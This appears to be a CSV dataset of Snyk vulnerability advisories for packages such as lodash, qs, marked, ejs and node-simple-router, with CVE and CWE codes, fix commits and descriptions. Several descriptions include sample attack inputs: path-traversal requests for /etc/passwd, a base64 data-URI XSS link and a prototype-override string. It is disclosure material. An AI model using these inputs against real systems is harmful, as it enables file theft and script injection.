CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-LODASH-540456,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash is an utility library delivering consistency, modularity, performance, & extras.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-LODASHRAILS-559450,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash-rails is a lodash for the Rails asset pipeline.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
CVE-2018-3721,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173733,14/02/2018,31/01/2018,https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Prototype Pollution,https://api.github.com/repos/lodash/lodash/commits/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,John-David Dalton,john.david.dalton@gmail.com,lodash,d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,Avoid merging properties on to __proto__ objects.,JavaScript,6.3,medium,"lodash.merge is a Lodash method _.merge exported as a Node.js module.
Affected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the Object prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:jasmine-core:20180216,18/02/2018,17/02/2018,https://github.com/jasmine/jasmine/commit/3b77f3818846ea68bcdcd7b0b734b48cb1f69cc1,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/jasmine/jasmine/commits/3b77f3818846ea68bcdcd7b0b734b48cb1f69cc1,Gregg Van Hove,gvanhove@pivotal.io,jasmine,3b77f3818846ea68bcdcd7b0b734b48cb1f69cc1,"Return <anonymous> for functions that have no actual words between keyword and (

- Also fixes a potential catastrophic backtracking if someone has
severely damaged their own `toString` during test execution.",JavaScript,3.7,low,"jasmine-core is a Behavior Driven Development testing framework for JavaScript.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (^\s*function\s*(\w*)\s*\() in order to parse JS toString output on a function to get a function name. This can cause an impact of about 10 seconds matching time for data 64K characters long.",2018
CVE-2017-16083,CWE-22,Snyk,https://security.snyk.io/vuln/npm:node-simple-router:20170523,12/06/2017,24/05/2017,https://github.com/sandy98/node-simple-router/commit/dfdd52e2e80607af433097d940b3834fd96df488,Directory Traversal,https://api.github.com/repos/sandy98/node-simple-router/commits/dfdd52e2e80607af433097d940b3834fd96df488,Domingo E. Savoretti,esavoretti@gmail.com,node-simple-router,dfdd52e2e80607af433097d940b3834fd96df488,version 0.10.1 Fixed directory traversal vulnerability,JavaScript,7.5,high,"node-simple-router is Yet another minimalistic router for node.js.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.
Thanks to Liang Gong for disclosing this vulnerability!",2017
CVE-2017-1002201,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-HAML-20362,08/05/2017,08/02/2017,https://github.com/haml/haml/commit/18576ae6e9bdcb4303fdbe6b3199869d289d67c2,Cross-site Scripting (XSS),https://api.github.com/repos/haml/haml/commits/18576ae6e9bdcb4303fdbe6b3199869d289d67c2,Takashi Kokubun,takashikkbn@gmail.com,haml,18576ae6e9bdcb4303fdbe6b3199869d289d67c2,"Always escape `'` in Haml::Helpers.#html_escape.

In some tests, `attr_wrapper` is changed to be ignored.

I'll split its fix to other commis because not Haml::Helpers but
Haml::AttributeBuilder is responsible for that.",Ruby,4.2,medium,"haml is a layer on top of HTML or XML that's designed to express the structure of documents in an easy way by using indentation rather than closing tags and allowing Ruby to be embedded with ease.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). When using user input to perform tasks on the server, characters like < > "" ' must be escaped properly. In this case, the ' character was missed. An attacker can manipulate the input to introduce additional attributes, potentially executing code.
engine = Haml::Engine.new(""%p&= foo"")
engine.render(Object.new,:foo => 'h""i""')
# => ""&lt;p&gt;h&amp;quot;i&amp;quot;&lt;/p&gt;""
engine.render(Object.new,:foo => ""h'i'"")
# => ""&lt;p&gt;h'i'&lt;/p&gt;\n""",2017
CVE-2017-16092,CWE-22,Snyk,https://security.snyk.io/vuln/npm:sencisho:20170418,01/05/2017,25/04/2017,https://github.com/julien/sencisho/commit/4254c85823fd0bbb0e8a53dc5a8e4f126639893d,Directory Traversal,https://api.github.com/repos/julien/sencisho/commits/4254c85823fd0bbb0e8a53dc5a8e4f126639893d,Julien C,julien.castelain@liferay.com,sencisho,4254c85823fd0bbb0e8a53dc5a8e4f126639893d,Fix directory traversal issue,JavaScript,7.5,high,"sencisho is a small http server for your local development.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.
Thanks to Liang Gong for disclosing this vulnerability!",2017
,CWE-494,Snyk,https://security.snyk.io/vuln/npm:ec2-price:20170418,01/05/2017,24/04/2017,https://github.com/toshimaru/ec2-price/commit/45fe7ec0ed9600d324a47d9161741b3571242693,Resources Downloaded over Insecure Protocol,https://api.github.com/repos/toshimaru/ec2-price/commits/45fe7ec0ed9600d324a47d9161741b3571242693,Toshimaru,me@toshimaru.net,ec2-price,45fe7ec0ed9600d324a47d9161741b3571242693,http to https,JavaScript,7.1,high,"ec2-price retrieves the latest EC2 prices via command line.
Affected versions of the package are vulnerable to Man in the Middle (MitM) attacks due to downloading resources over an insecure protocol. Without a secure connection, it is possible for an attacker to intercept this connection and alter the packages received. In serious cases, this may even lead to Remote Code Execution (RCE) on your host server.
Many thanks to Liang Gong for disclosing this vulnerability.",2017
,CWE-22,Snyk,https://security.snyk.io/vuln/npm:guaycuru:20170418,01/05/2017,24/04/2017,https://github.com/sandy98/guaycuru/commit/7b64c9cb13dca0d4ad40fd37158dbe31dd59a0d0,Directory Traversal,https://api.github.com/repos/sandy98/guaycuru/commits/7b64c9cb13dca0d4ad40fd37158dbe31dd59a0d0,Domingo E. Savoretti,esavoretti@gmail.com,guaycuru,7b64c9cb13dca0d4ad40fd37158dbe31dd59a0d0,"version 0.2.4 Upgraded to use NSR 0.10.1, which fixes directory traversal vulnerability",Unknown,4.3,medium,"guaycuru is a Static Web Server built on top of Node Simple Router.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.
Thanks to Liang Gong for disclosing this vulnerability!",2017
CVE-2017-16107,CWE-22,Snyk,https://security.snyk.io/vuln/npm:pooledwebsocket:20170420,25/04/2017,20/04/2017,https://github.com/Eeems/PooledWebSocket/commit/7b3b4e5c6be6d8a964296fa3c50e38dc07e9701d,Directory Traversal,https://api.github.com/repos/Eeems/PooledWebSocket/commits/7b3b4e5c6be6d8a964296fa3c50e38dc07e9701d,Nathaniel van Diepen,nathaniel.vandiepen@gmail.com,PooledWebSocket,7b3b4e5c6be6d8a964296fa3c50e38dc07e9701d,"Update server.js

Resolve directory traversal attack",JavaScript,4.3,medium,"pooledwebsocket is a Pooled Web Socket server.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.
Thanks to Liang Gong for disclosing this vulnerability!",2017
CVE-2017-16084,CWE-22,Snyk,https://security.snyk.io/vuln/npm:list-n-stream:20170418,24/04/2017,18/04/2017,https://github.com/KoryNunn/list-n-stream/commit/99b0b40b34aaedfcdf25da46bef0a06b9c47fb59,Directory Traversal,https://api.github.com/repos/KoryNunn/list-n-stream/commits/99b0b40b34aaedfcdf25da46bef0a06b9c47fb59,Kory Nunn,knunn187@gmail.com,list-n-stream,99b0b40b34aaedfcdf25da46bef0a06b9c47fb59,Fixed traversal vulnerability,JavaScript,7.5,high,"list-n-stream is super basic dirlist and file streaming server.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.
Thanks to Liang Gong for disclosing this vulnerability!",2017
,CWE-300,Snyk,https://security.snyk.io/vuln/npm:nodux-core:20170424,24/04/2017,24/04/2017,https://github.com/davidmarkclements/nodux-core/commit/06787343a2a9bd1b37820d69a46022f5a7af3b86,Resources Downloaded over Insecure Protocol,https://api.github.com/repos/davidmarkclements/nodux-core/commits/06787343a2a9bd1b37820d69a46022f5a7af3b86,davidmarkclements,huperekchuno@googlemail.com,nodux-core,06787343a2a9bd1b37820d69a46022f5a7af3b86,dl over https,JavaScript,7.1,high,"nodux-core is A Tiny Core Linux build that includes node.js.
Affected versions of the package are vulnerable to Man in the Middle (MitM) attacks due to downloading resources over an insecure protocol. Without a secure connection, it is possible for an attacker to intercept this connection and alter the packages received. In serious cases, this may even lead to Remote Code Execution (RCE) on your host server.
Many thanks to Liang Gong for disclosing this vulnerability.",2017
CVE-2017-1000048,CWE-20,Snyk,https://security.snyk.io/vuln/npm:qs:20170213,01/03/2017,13/02/2017,https://github.com/ljharb/qs/commit/beade029171b8cef9cee0d03ebe577e2dd84976d,Prototype Override Protection Bypass,https://api.github.com/repos/ljharb/qs/commits/beade029171b8cef9cee0d03ebe577e2dd84976d,Jordan Harband,ljharb@gmail.com,qs,beade029171b8cef9cee0d03ebe577e2dd84976d,[Fix] ensure that `allowPrototypes: false` does not ever shadow Object.prototype properties.,JavaScript,7.5,high,"qs is a querystring parser that supports nesting and arrays, with a depth limit.
Affected versions of this package are vulnerable to Prototype Override Protection Bypass. By default qs protects against attacks that attempt to overwrite an object's existing prototype properties, such as toString(), hasOwnProperty(),etc.
From qs documentation:

By default parameters that would overwrite properties on the object prototype are ignored, if you wish to keep the data from those fields either use plainObjects as mentioned above, or set allowPrototypes to true which will allow user input to overwrite those properties. WARNING It is generally a bad idea to enable this option as it can cause problems when attempting to use the properties that have been overwritten. Always be careful with this option.

Overwriting these properties can impact application logic, potentially allowing attackers to work around security controls, modify data, make the application unstable and more.
In versions of the package affected by this vulnerability, it is possible to circumvent this protection and overwrite prototype properties and functions by prefixing the name of the parameter with [ or ]. e.g. qs.parse(""]=toString"") will return {toString = true}, as a result, calling toString() on the object will throw an exception.
Example:
qs.parse('toString=foo', { allowPrototypes: false })
// {}

qs.parse(""]=toString"", { allowPrototypes: false })
// {toString = true} <== prototype overwritten

For more information, you can check out our blog.",2017
CVE-2017-1000427,CWE-79,Snyk,https://security.snyk.io/vuln/npm:marked:20170112,30/01/2017,12/01/2017,https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,Cross-site Scripting (XSS),https://api.github.com/repos/chjj/marked/commits/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,Matt Austin,matt@m-austin.com,marked,cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,added data: link fix to prevent xss,JavaScript,7.5,high,"marked is a low-level compiler for parsing markdown without caching or blocking for long periods of time.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). Data URIs enable embedding small files in line in HTML documents, provided in the URL itself.
Attackers can craft malicious web pages containing either HTML or script code that utilizes the data URI scheme, allowing them to bypass access controls or steal sensitive information.
An example of data URI used to deliver javascript code. The data holds <script>alert('XSS')</script> tag in base64 encoded format.
[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",2017
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MARKED-60185,12/01/2017,12/01/2017,https://github.com/chjj/marked/commit/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,Cross-site Scripting (XSS),https://api.github.com/repos/chjj/marked/commits/cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,Matt Austin,matt@m-austin.com,marked,cd2f6f5b7091154c5526e79b5f3bfb4d15995a51,added data: link fix to prevent xss,JavaScript,7.5,high,"marked is a markdown parser and compiler used for rendering markdown content to html.
Affected versions of the package allowed the use of data: URIs for all mime types by default potentially opening a door for Cross-site Scripting (XSS) attacks.
Data URIs enable embedding small files in line in HTML documents, provided in the URL itself.
Attackers can craft malicious web pages containing either HTML or script code that utilizes the data URI scheme, allowing them to bypass access controls or steal sensitive information.
An example of data URI used to deliver javascript code. The data holds <script>alert('XSS')</script> tag in base64 encoded format.
[xss link](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",2017
CVE-2017-16029,CWE-22,Snyk,https://security.snyk.io/vuln/npm:hostr:20161211,20/12/2016,11/12/2016,https://github.com/henrytseng/hostr/commit/789a00047459fd80b6f0a9701a1378a47fb73ba8,Directory Traversal,https://api.github.com/repos/henrytseng/hostr/commits/789a00047459fd80b6f0a9701a1378a47fb73ba8,Henry Tseng,henryiis@gmail.com,hostr,789a00047459fd80b6f0a9701a1378a47fb73ba8,Filter path names,JavaScript,5.3,medium,"hostr is a simple web server for the current working directory.  Used for hello world style web sites hosting only files in current directory structure.  Watches files and integrates with LiveReload.
Affected versions of the package do not filter http GET requests in javascript code, allowing an attacker to retrieve confidential files over the network by requesting urls like:  http://localhost:3000/../../../etc/passwd. CURLing the same request will not succeed.
Many thanks to Liang Gong for disclosing this vulnerability.",2016
CVE-2017-16003,CWE-494,Snyk,https://security.snyk.io/vuln/npm:windows-build-tools:21122016,09/01/2017,21/12/2016,https://github.com/felixrieseberg/windows-build-tools/commit/9835d33e68f2cb5e4d148e954bb3ed0221d98e90,Resources Downloaded over Insecure Protocol,https://api.github.com/repos/felixrieseberg/windows-build-tools/commits/9835d33e68f2cb5e4d148e954bb3ed0221d98e90,Felix Rieseberg,felix@felixrieseberg.com,windows-build-tools,9835d33e68f2cb5e4d148e954bb3ed0221d98e90,:wrench: Use HTTPS - Thanks to @grander,JavaScript,7.1,high,"windows-build-tools installs C++ Build Tools for Windows using npm.
Affected versions of the package are vulnerable to Man in the Middle (MitM) attacks due to downloading resources over an insecure protocol. Without a secure connection, it is possible for an attacker to intercept this connection and alter the packages received. In serious cases, this may even lead to Remote Code Execution (RCE) on your host server.
Many thanks to Liang Gong for disclosing this vulnerability.",2017
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-HOSTR-60169,20/12/2016,20/12/2016,https://github.com/henrytseng/hostr/commit/789a00047459fd80b6f0a9701a1378a47fb73ba8,Directory Traversal,https://api.github.com/repos/henrytseng/hostr/commits/789a00047459fd80b6f0a9701a1378a47fb73ba8,Henry Tseng,henryiis@gmail.com,hostr,789a00047459fd80b6f0a9701a1378a47fb73ba8,Filter path names,JavaScript,5.3,medium,"hostr is a simple web server for the current working directory.  Used for hello world style web sites hosting only files in current directory structure.  Watches files and integrates with LiveReload.
Affected versions of the package do not filter http GET requests in javascript code, allowing an attacker to retrieve confidential files over the network by requesting urls like:  http://localhost:3000/../../../etc/passwd. CURLing the same request will not succeed.
Many thanks to Liang Gong for disclosing this vulnerability.",2016
CVE-2017-1000188,CWE-79,Snyk,https://security.snyk.io/vuln/npm:ejs:20161130,06/12/2016,28/11/2016,https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f,Cross-site Scripting (XSS),https://api.github.com/repos/mde/ejs/commits/49264e0037e313a0a3e033450b5c184112516d8f,mde,mde@fleegix.org,ejs,49264e0037e313a0a3e033450b5c184112516d8f,Blacklist a few other unsafe opts from passing in data obj,JavaScript,5.9,medium,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Cross-site Scripting by letting the attacker under certain conditions control and override the filename option causing it to render the value as is, without escaping it.
You can read more about this vulnerability on the Snyk blog.
There's also a Remote Code Execution & Denial of Service vulnerabilities caused by the same behaviour.",2016
CVE-2017-1000189,CWE-400,Snyk,https://security.snyk.io/vuln/npm:ejs:20161130-1,06/12/2016,28/11/2016,https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f,Denial of Service (DoS),https://api.github.com/repos/mde/ejs/commits/49264e0037e313a0a3e033450b5c184112516d8f,mde,mde@fleegix.org,ejs,49264e0037e313a0a3e033450b5c184112516d8f,Blacklist a few other unsafe opts from passing in data obj,JavaScript,5.9,medium,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Denial of Service by letting the attacker under certain conditions control and override the localNames option causing it to crash.
You can read more about this vulnerability on the Snyk blog.
There's also a Remote Code Execution & Cross-site Scripting vulnerabilities caused by the same behaviour.",2016
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-EJS-60143,06/12/2016,06/12/2016,https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f,Cross-site Scripting (XSS),https://api.github.com/repos/mde/ejs/commits/49264e0037e313a0a3e033450b5c184112516d8f,mde,mde@fleegix.org,ejs,49264e0037e313a0a3e033450b5c184112516d8f,Blacklist a few other unsafe opts from passing in data obj,JavaScript,5.9,medium,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Cross-site Scripting by letting the attacker under certain conditions control and override the filename option causing it to render the value as is, without escaping it.
You can read more about this vulnerability on the Snyk blog.
There's also a Remote Code Execution & Denial of Service vulnerabilities caused by the same behaviour.",2016
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-EJS-60144,06/12/2016,06/12/2016,https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f,Denial of Service (DoS),https://api.github.com/repos/mde/ejs/commits/49264e0037e313a0a3e033450b5c184112516d8f,mde,mde@fleegix.org,ejs,49264e0037e313a0a3e033450b5c184112516d8f,Blacklist a few other unsafe opts from passing in data obj,JavaScript,5.9,medium,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Denial of Service by letting the attacker under certain conditions control and override the localNames option causing it to crash.
You can read more about this vulnerability on the Snyk blog.
There's also a Remote Code Execution & Cross-site Scripting vulnerabilities caused by the same behaviour.",2016
,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-EJS-60142,02/12/2016,02/12/2016,https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6,Remote Code Execution,https://api.github.com/repos/mde/ejs/commits/3d447c5a335844b25faec04b1132dbc721f9c8f6,mde,mde@fleegix.org,ejs,3d447c5a335844b25faec04b1132dbc721f9c8f6,Blacklist 'root' option when looking for opts in data obj,JavaScript,8.1,high,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Remote Code Execution by letting the attacker under certain conditions control the source folder from which the engine renders include files.
You can read more about this vulnerability on the Snyk blog.
There's also a Cross-site Scripting & Denial of Service vulnerabilities caused by the same behaviour.",2016
CVE-2017-1000228,CWE-94,Snyk,https://security.snyk.io/vuln/npm:ejs:20161128,29/11/2016,28/11/2016,https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6,Arbitrary Code Execution,https://api.github.com/repos/mde/ejs/commits/3d447c5a335844b25faec04b1132dbc721f9c8f6,mde,mde@fleegix.org,ejs,3d447c5a335844b25faec04b1132dbc721f9c8f6,Blacklist 'root' option when looking for opts in data obj,JavaScript,8.1,high,"ejs is a popular JavaScript templating engine.
Affected versions of the package are vulnerable to Remote Code Execution by letting the attacker under certain conditions control the source folder from which the engine renders include files.
You can read more about this vulnerability on the Snyk blog.
There's also a Cross-site Scripting & Denial of Service vulnerabilities caused by the same behaviour.",2016
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:moment:20161019,24/10/2016,19/10/2016,https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/moment/moment/commits/663f33e333212b3800b63592cd8e237ac8fabdb9,Iskren Chernev,iskren.chernev@gmail.com,moment,663f33e333212b3800b63592cd8e237ac8fabdb9,"Merge pull request #3525 from ichernev:speedup-regex

[misc] Speedup month standalone/format regexes",JavaScript,5.9,medium,"October 19th, 2016 - Reported the issue to package owner.
October 19th, 2016 - Issue acknowledged by package owner.
October 24th, 2016 - Issue fixed and version 2.15.2 released.",2016
